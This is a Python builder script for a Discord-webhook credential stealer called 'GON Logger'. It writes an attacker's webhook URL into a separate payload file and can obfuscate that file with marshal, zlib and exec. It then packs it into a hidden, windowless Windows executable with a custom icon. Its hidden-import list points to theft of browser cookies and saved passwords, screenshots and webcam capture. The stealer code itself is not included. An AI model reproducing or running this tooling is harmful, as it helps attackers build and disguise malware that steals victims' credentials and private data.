import marshal
import zlib
import os
import time
import sys
import requests
import shutil
import tempfile
from pathlib import Path

logo = """
░██████╗░░█████╗░███╗░░██╗
██╔════╝░██╔══██╗████╗░██║
██║░░██╗░██║░░██║██╔██╗██║
██║░░╚██╗██║░░██║██║╚████║
╚██████╔╝╚█████╔╝██║░╚███║
░╚═════╝░░╚════╝░╚═╝░░╚══╝
    >> [Grabber developed by @tlwm]
"""

def check_dependencies():
    try:
        from pystyle import Write, Colors, Center
        return True
    except ImportError:
        print("Installing Requirements For You")
        os.system(f'{sys.executable} -m pip install --quiet requests pystyle pyinstaller')
        print("Please Rerun The Program")
        time.sleep(3)
        return False

def download_icon(icon_url, output_path):
    try:
        response = requests.get(icon_url, timeout=10)
        if response.status_code == 200:
            content_type = response.headers.get('content-type', '').lower()
            if any(img_type in content_type for img_type in ['image/jpeg', 'image/jpg', 'image/png', 'image/ico', 'image/x-icon']):
                with open(output_path, 'wb') as f:
                    f.write(response.content)
                return True
        return False
    except:
        return False

def convert_to_ico(image_path, ico_path):
    try:
        from PIL import Image
        
        if image_path.lower().endswith('.ico'):
            shutil.copy(image_path, ico_path)
            return True
        
        img = Image.open(image_path)
        
        sizes = [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)]
        
        icon_sizes = []
        for size in sizes:
            if img.width >= size[0] and img.height >= size[1]:
                resized = img.resize(size, Image.Resampling.LANCZOS)
                icon_sizes.append(resized)
        
        if icon_sizes:
            icon_sizes[0].save(ico_path, format='ICO', sizes=[(s.width, s.height) for s in icon_sizes])
            return True
        else:
            img.save(ico_path, format='ICO')
            return True
            
    except Exception as e:
        print(f"Could not convert to .ico: {e}")
        return False

def main():
    if not check_dependencies():
        return
    
    from pystyle import Write, Colors, Center
    
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title GON Logger Builder')
    
    Write.Print(Center.XCenter(logo + "\n"), Colors.purple_to_blue, interval=0.005)
    Write.Print(Center.XCenter("GitHub: @00ie | Discord: tlwm | Telegram: feicoes\n\n"), Colors.cyan_to_blue, interval=0.01)
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    main_py_path = os.path.join(current_dir, "main.py")
    
    if not os.path.exists(main_py_path):
        Write.Print("\nmain.py not found in current directory!\n", Colors.red, interval=0.01)
        Write.Print("Please make sure main.py is in the same folder as this builder.\n", Colors.yellow, interval=0.01)
        time.sleep(3)
        exit()
    
    webhook = Write.Input("\nEnter webhook URL: ", Colors.purple_to_blue, interval=0.01)
    
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        Write.Print("\nInvalid Discord webhook format!\n", Colors.red, interval=0.01)
        time.sleep(2)
        exit()
    
    try:
        r = requests.get(webhook, timeout=10)
        if r.status_code == 200:
            Write.Print("\nWebhook Is Working\n", Colors.green, interval=0.01)
            time.sleep(1)
        else:
            Write.Print("\nWebhook Is Not Working\n", Colors.red, interval=0.01)
            time.sleep(3)
            exit()
    except:
        Write.Print("\nCould not verify webhook (continuing anyway)\n", Colors.yellow, interval=0.01)
        time.sleep(1)
    
    name = Write.Input("\nEnter output filename (without .py): ", Colors.purple_to_blue, interval=0.01)
    
    Write.Print(f"\nReading main.py from local folder...\n", Colors.blue, interval=0.01)
    
    try:
        with open(main_py_path, 'r', encoding='utf-8') as f:
            original_code = f.read()
        
        import re
        
        webhook_pattern = r'WEBHOOK_URL\s*=\s*["\'][^"\']*["\']'
        
        if re.search(webhook_pattern, original_code):
            modified_code = re.sub(webhook_pattern, f'WEBHOOK_URL = "{webhook}"', original_code)
        else:
            modified_code = original_code.replace("WEBHOOK_PLACEHOLDER", webhook)
        
        output_py = f"{name}.py"
        with open(output_py, 'w', encoding='utf-8') as f:
            f.write(modified_code)
        
        Write.Print(f"{name}.py created successfully!\n", Colors.green, interval=0.01)
        
    except Exception as e:
        Write.Print(f"Error processing main.py: {e}\n", Colors.red, interval=0.01)
        exit()
    
    protection = Write.Input(f"\nAdd obfuscation to {name}.py? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
    
    if protection == 'y':
        try:
            with open(f'{name}.py', 'r', encoding='utf-8') as fi:
                code_to_obfuscate = fi.read()
            
            marshaled = marshal.dumps(compile(code_to_obfuscate, f'{name}.py', 'exec'))
            compressed = zlib.compress(marshaled)
            
            with open(f"{name}.py", 'w', encoding='utf-8') as f:
                obfuscated_code = f'''
import marshal, zlib
exec(marshal.loads(zlib.decompress({compressed})))
'''
                f.write(obfuscated_code)
            
            Write.Print("Code obfuscated successfully!\n", Colors.green, interval=0.01)
        except Exception as e:
            Write.Print(f"Could not obfuscate: {e}\n", Colors.yellow, interval=0.01)
    
    compile_choice = Write.Input("\nCompile to .exe? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
    
    icon_path = None
    if compile_choice == 'y':
        icon_choice = Write.Input("\nAdd icon to .exe? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
        
        if icon_choice == 'y':
            icon_url = Write.Input("\nEnter icon URL (JPG/PNG/ICO): ", Colors.purple_to_blue, interval=0.01)
            
            if icon_url and icon_url.strip():
                Write.Print("\nDownloading icon...\n", Colors.blue, interval=0.01)
                
                temp_dir = tempfile.mkdtemp()
                temp_icon = os.path.join(temp_dir, "temp_icon")
                
                if download_icon(icon_url, temp_icon):
                    ico_path = os.path.join(temp_dir, "icon.ico")
                    
                    if convert_to_ico(temp_icon, ico_path):
                        icon_path = ico_path
                        Write.Print("Icon downloaded and converted successfully!\n", Colors.green, interval=0.01)
                    else:
                        if temp_icon.lower().endswith('.ico'):
                            icon_path = temp_icon
                            Write.Print("Icon downloaded successfully!\n", Colors.green, interval=0.01)
                        else:
                            Write.Print("Could not convert icon to .ico format\n", Colors.yellow, interval=0.01)
                else:
                    Write.Print("Could not download icon\n", Colors.red, interval=0.01)
        
        Write.Print("\nCompiling... This may take a moment...\n", Colors.blue, interval=0.01)
        
        hidden_imports = [
            'requests', 'os', 'socket', 'threading', 'platform', 'json',
            'browser_cookie3', 'cv2', 're', 'uuid', 'psutil', 'sys',
            'win32api', 'PIL', 'PIL.ImageGrab', 'browser_history',
            'Crypto.Cipher', 'win32crypt', 'sqlite3', 'shutil',
            'base64', 'tempfile', 'datetime', 'winreg', 'pyautogui',
            'prettytable', 'getmac', 'zipfile', 'collections',
            'multiprocessing', 'urllib.request', 'subprocess',
            'discord_webhook', 'browser_cookie3', 'Crypto.Cipher.AES',
            'win32con', 'win32api', 'pyautogui'
        ]
        
        imports_string = ' '.join([f'--hidden-import="{imp}"' for imp in hidden_imports])
        
        compile_cmd = f'pyinstaller --onefile --noconsole {imports_string} --clean '
        
        if icon_path and os.path.exists(icon_path):
            compile_cmd += f'--icon="{icon_path}" '
        
        compile_cmd += f'--upx-dir=upx ' if os.path.exists('upx') else ''
        
        compile_cmd += f'"{name}.py"'
        
        Write.Print(f"\nCommand: {compile_cmd}\n", Colors.cyan, interval=0.01)
        
        result = os.system(compile_cmd)
        
        if icon_path:
            try:
                shutil.rmtree(os.path.dirname(icon_path))
            except:
                pass
        
        cleanup_files = [f'{name}.spec', 'build']
        for file in cleanup_files:
            if os.path.exists(file):
                if os.path.isdir(file):
                    shutil.rmtree(file)
                else:
                    os.remove(file)
        
        if os.path.exists('dist'):
            exe_path = os.path.join('dist', f'{name}.exe')
            if os.path.exists(exe_path):
                Write.Print(f"\n{name}.exe created in dist/ folder!\n", Colors.green, interval=0.01)
                
                move_choice = Write.Input(f"\nMove {name}.exe to current folder? (y/n): ", Colors.purple_to_blue, interval=0.01).lower()
                if move_choice == 'y':
                    try:
                        shutil.move(exe_path, f'{name}.exe')
                        Write.Print(f"Moved to {name}.exe\n", Colors.green, interval=0.01)
                    except Exception as e:
                        Write.Print(f"Could not move: {e}\n", Colors.yellow, interval=0.01)
            else:
                Write.Print("\nCompilation might have failed\n", Colors.yellow, interval=0.01)
        else:
            Write.Print("\nCompilation might have failed\n", Colors.yellow, interval=0.01)
    
    Write.Print("\n" + "="*50 + "\n", Colors.purple, interval=0.01)
    Write.Print("Builder completed successfully!\n", Colors.green, interval=0.01)
    Write.Print(f"Developer: @tlwm\n", Colors.cyan, interval=0.01)
    Write.Print(f"GitHub: github.com/00ie\n", Colors.cyan, interval=0.01)
    
    if compile_choice == 'y' and os.path.exists('dist'):
        exe_size = 0
        exe_path = os.path.join('dist', f'{name}.exe')
        if os.path.exists(exe_path):
            exe_size = os.path.getsize(exe_path) / (1024 * 1024)
            Write.Print(f"Executable size: {exe_size:.2f} MB\n", Colors.cyan, interval=0.01)
    
    Write.Print("\nThe program will exit in 5 seconds...\n", Colors.blue, interval=0.01)
    Write.Print("="*50 + "\n", Colors.purple, interval=0.01)
    
    time.sleep(5)

if __name__ == "__main__":
    main()